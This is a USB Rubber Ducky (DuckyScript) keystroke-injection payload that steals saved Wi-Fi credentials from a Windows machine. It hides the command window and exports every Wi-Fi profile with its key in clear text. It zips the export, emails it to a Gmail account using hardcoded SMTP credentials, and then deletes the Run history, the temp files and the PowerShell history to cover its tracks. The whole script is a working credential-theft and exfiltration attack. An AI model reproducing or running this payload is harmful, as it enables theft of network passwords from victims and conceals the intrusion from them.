REM # Wifi-Creds-Dump
REM # Created By: N0m4d1k
REM # This takes approx 13 seconds to run.
REM *****************
REM *****************
REM # Hides and Obfuscates CLI
REM *****************
DELAY 400
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 400
STRING color FE & mode con:cols=18 lines=1
ENTER
DELAY 150
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
REM *****************
REM *****************
REM # Dumps Wifi Creds into Dir and Zips it.
REM *****************
STRING powershell
ENTER
DELAY 400
STRING cd AppData\Local\Temp
ENTER
STRING mkdir A
ENTER
STRING cd A
ENTER
STRING netsh wlan export profile key=clear
ENTER
DELAY 150
STRING cd ..
ENTER
STRING tar -a -c -f A.zip A
ENTER
REM *****************
REM *****************
REM # E-mails zip to yourself
REM *****************
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSSL = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('easye6654@gmail.com', 'vdowlchlcgbbjrfq')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'easye6654@gmail.com'
ENTER
STRING $ReportEmail.To.Add('easye6654@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Hello from the duck'
ENTER
STRING $ReportEmail.Body = 'QUACK'
ENTER
STRING $ReportEmail.Attachments.Add("Desktop\A.zip")
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 150
REM *****************
REM # Cleanup
REM *****************
STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
ENTER
STRING del /q/f/s %TEMP%
ENTER
DELAY 150
STRING cd ..\..\
ENTER
STRING cd Roaming\Microsoft\Windows\PowerShell\PSReadLine
ENTER
STRING del ConsoleHost_history.txt
ENTER
STRING exit
ENTER
DELAY 100
STRING exit
ENTER